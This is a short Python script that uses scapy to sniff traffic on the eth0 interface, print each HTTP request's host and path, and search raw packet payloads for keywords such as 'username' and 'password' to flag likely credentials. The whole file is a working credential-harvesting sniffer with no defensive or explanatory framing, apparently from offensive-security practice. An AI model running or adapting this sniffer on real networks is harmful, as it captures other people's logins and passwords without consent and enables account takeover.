#!/usr/bin/ebv python

import scapy.all as scapy
from scapy.layers import http

def get_http_url(packet):
    url= packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
    print("[+] HTTP Request : "+url)

def filter_credentials(data):
    keys=["user","username","usr","pass","password","credentials"]
    for key in keys:
        if key in data:
            print("\n\n\t [+] possible data found >> "+data+" \n\n")
            break

def process_sniffed_packet(packet):
    #print(packet)
    if packet.haslayer(http.HTTPRequest):
        get_http_url(packet)
        if packet.haslayer(scapy.Raw):
            filter_credentials(packet[scapy.Raw].load)

def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)

sniff("eth0")